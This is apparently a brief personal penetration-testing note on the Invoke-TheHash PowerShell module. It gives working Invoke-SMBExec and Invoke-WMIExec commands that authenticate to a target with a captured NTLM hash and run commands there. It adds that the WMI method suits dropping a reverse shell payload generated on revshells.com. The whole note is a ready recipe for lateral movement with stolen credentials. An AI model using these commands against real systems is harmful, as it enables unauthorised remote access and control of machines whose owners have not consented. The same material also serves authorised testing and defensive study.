- PowerShell Pass-the-Hash tool, uses SMB or WMI for command execution, doesn't need local admin on OUR machine (just need the hash itself to be valid/admin on the target)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <ip> -Domain X -Username Y -Hash <hash> -Command "whoami"
Invoke-WMIExec -Target <ip> -Domain X -Username Y -Hash <hash> -Command "<cmd>"
```
- SMB method = good for quick command execution
- WMI method = good for dropping a reverse shell payload (generate one at revshells.com)

See [[Pass The Hash]]